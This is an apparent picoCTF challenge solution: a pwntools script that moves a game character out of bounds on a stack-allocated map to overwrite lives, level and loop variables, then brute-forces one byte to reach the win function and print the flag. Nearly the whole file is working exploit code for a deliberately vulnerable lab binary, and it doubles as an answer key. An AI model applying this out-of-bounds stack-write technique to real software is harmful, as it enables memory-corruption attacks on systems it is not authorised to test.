#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('game')

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *0x8049673
continue
'''.format(**locals())



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


class Player:
    def __init__(self, y, x):
        self.x = x
        self.y = y

    def get_position(self):
        return (self.x, self.y)
    
    def get_relative_index(self):
        return self.x + (self.y * 0x5a)
    
    def move(self, direction):
        match direction:
            case 'a':
                self.x -= 1
            case 'd':
                self.x += 1
            case 'w':
                self.y -= 1
            case 's':
                self.y += 1
        
        log.info(f'Player position (x, y): {self.get_position()} | map[{self.get_relative_index()}]')

def read_map():
    return io.recv(0x6c7)


def send_movement(player, direction, read=True):
    io.send(direction)
    str_direction = direction.decode('utf-8')
    log.info(f'Sending {str_direction}')
    for c in str_direction:
        player.move(c)
        if read: read_map()

def change_tile_character(lower_byte):
    io.send(b'l' + lower_byte)
    log.info(f'Changing tile to: {lower_byte.decode("utf-8")}')
    # read_map()

def init():
    global io
    global check

    io = start()

def solve():
    global data
    """
    char map [2700];
    int level = 1;
    int i = 0;

    level = $ebp-0xaac
    map = $ebp-0xa99
    i = $ebp-0xc

    level = 0xffffc3dc 
    i = 0xffffce7c
    map = 0xffffc3ef 

    player->x = 0xffffc3c8
    player->y = 0xffffc3d0
    player->lives = 0xffffc3e8
    map[player->y + player->x * 90] = player_tile;

    So, the condition for the loop to exit and call the win() function is when the player's position is at (29, 89) and the level is 5, and i is 4
    """

    player = Player(4, 4)

    def get_lives():
        """
        Get large amount of lives
        """
        change_tile_character(b'~')
        send_movement(player, b'a'*10)
        send_movement(player, b'w'*4)

        # {-7, 0}

    def reset_live():
        """
        Reset the co-ordinates to (4, 4)
        """
        send_movement(player, b's'*4)
        send_movement(player, b'd'*10)


    for _ in range(4):
        get_lives()
        reset_live()
        change_tile_character(b'z')
        send_movement(player, b'a'*55)
        send_movement(player, b'w'*4)

    get_lives()
    reset_live()
    io.send(b'l'+p8(check))
    send_movement(player, b'a'*55)
    send_movement(player, b'w'*4)

    log.info(f'Brute force counter: {check}')
    
    data = io.recvall(timeout=2)


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    global check

    for check in range(0xe5, 0xff):
        main()
    
        # check = 244
        if b"pico" in data:
            print(data)
            break

